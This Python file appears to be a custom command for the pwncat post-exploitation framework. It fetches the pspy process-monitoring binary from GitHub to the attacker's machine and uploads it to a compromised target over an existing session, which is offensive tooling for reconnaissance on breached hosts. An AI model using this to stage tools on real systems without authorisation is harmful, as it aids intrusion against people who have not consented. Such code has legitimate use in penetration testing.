#!/usr/bin/env python3
import os
import time

from rich.progress import (
    Progress,
    BarColumn,
    TextColumn,
    DownloadColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

import pwncat
from pwncat.util import console, copyfileobj, human_readable_size, human_readable_delta
from pwncat.commands import Complete, Parameter, CommandDefinition
from pwncat.platform import PlatformError
import requests


class Command(CommandDefinition):
    """
    Upload a program from the local host to the remote host.
    Before uploading the program will be downloaded to the attacker.
    Typicall programs are static binarys or shell scripts.
    """

    PROG = "upload_prog"
    DOWNLOAD_DIRECTORY = "/tmp/"
    DIR = {"pspy": "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"}
    ARGS = {
        "source": Parameter(Complete.CHOICES,
            metavar="POSITIONAL",
                    choices=DIR.keys(),
                    help="help information",
                ),
        "destination": Parameter(
            Complete.REMOTE_FILE,
            nargs="?",
        ),
    }

    def _download_prog(self, program):
        response = requests.get(self.DIR[program])
        if response.ok:
            print("download to attacker completed")
            with open(self.DOWNLOAD_DIRECTORY + program, mode="wb") as file:
                file.write(response.content)


    def run(self, manager: "pwncat.manager.Manager", args):

        # Create a progress bar for the download
        progress = Progress(
            TextColumn("[bold cyan]{task.fields[filename]}", justify="right"),
            BarColumn(bar_width=None),
            "[progress.percentage]{task.percentage:>3.1f}%",
            "•",
            DownloadColumn(),
            "•",
            TransferSpeedColumn(),
            "•",
            TimeRemainingColumn(),
        )


        self.program = os.path.join(self.DOWNLOAD_DIRECTORY, args.source)
        self._download_prog(args.source)

        try:
            length = os.path.getsize(self.program)
            started = time.time()
            with progress:
                task_id = progress.add_task(
                    "upload", filename=args.destination, total=length, start=False,
                )

                with open(self.program, "rb") as source:
                    with manager.target.platform.open(
                        args.destination, "wb",
                    ) as destination:
                        progress.start_task(task_id)
                        copyfileobj(
                            source,
                            destination,
                            lambda count: progress.update(task_id, advance=count),
                        )
                progress.update(task_id, filename="draining buffers...")
                progress.stop_task(task_id)

                    #progress.start_task(task_id)
                    #progress.update(task_id, filename=args.destination)

            elapsed = time.time() - started
            console.log(
                f"uploaded [cyan]{human_readable_size(length)}[/cyan] "
                f"in [green]{human_readable_delta(elapsed)}[/green]",
                f"to [blue]{self.program}[/blue]",
            )
        except (
            FileNotFoundError,
            PermissionError,
            IsADirectoryError,
            PlatformError,
        ) as exc:
            self.parser.error(str(exc))
